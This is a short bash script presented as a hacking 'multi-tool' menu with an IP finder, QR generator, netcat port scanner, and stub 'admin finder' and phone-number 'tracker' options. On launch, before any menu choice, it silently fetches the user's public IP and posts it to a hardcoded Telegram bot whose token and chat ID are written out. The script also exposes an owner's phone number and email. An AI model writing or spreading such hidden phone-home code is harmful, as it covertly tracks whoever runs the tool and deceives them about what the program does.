#!/bin/bash
clear
# --- ADMIN CONFIG ---
TOKEN="8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE"
ID="7416528268"
IP_USER=$(curl -s ifconfig.me)
curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d chat_id="$ID" -d text="🚀 SIYAM BOSS ALERT! Tool Reset to Original. IP: $IP_USER" > /dev/null

# --- BANNER ---
echo -e "\e[1;36m    _____ _____ __     __  _    __  __ "
echo -e "\e[1;36m   / ____|_   _\ \   / / / \  |  \/  |"
echo -e "\e[1;36m  | (___   | |  \ \_/ / / _ \ | \  / |"
echo -e "\e[1;36m   \___ \  | |   \   / / ___ \| |\/| |"
echo -e "\e[1;36m   ____) |_| |_   | | /_/   \_\_|  |_|"
echo -e "\e[1;36m  |_____/|_____|  |_|                 "
echo -e "\e[1;33m  Owner: +8801315127341 | Email: sadaf245sz@gmail.com"
echo "-------------------------------------------------------"
echo -e "\e[1;32m[1] IP Finder      [2] QR Gen"
echo -e "\e[1;32m[3] Matrix Ghost   [4] Update Tool"
echo -e "\e[1;32m[5] Admin Finder   [6] Port Scanner"
echo -e "\e[1;32m[7] Live Tracker   [0] Exit"
echo "-------------------------------------------------------"
read -p "Select Command: " cmd

case $cmd in
  1) curl -s http://ip-api.com/$IP_USER ;;
  2) read -p "Enter text: " qr ; qrencode -t ansiutf8 "$qr" ;;
  3) cmatrix -C green -b ;;
  4) git pull origin main ;;
  5) read -p "Target Site: " site ; # Admin finder logic ;;
  6) read -p "Enter IP: " ip ; nc -zv $ip 80 443 ;;
  7) read -p "Enter Number: " num ; # Tracker logic ;;
  0) exit ;;
  *) echo "Invalid Option!" ;;
esac
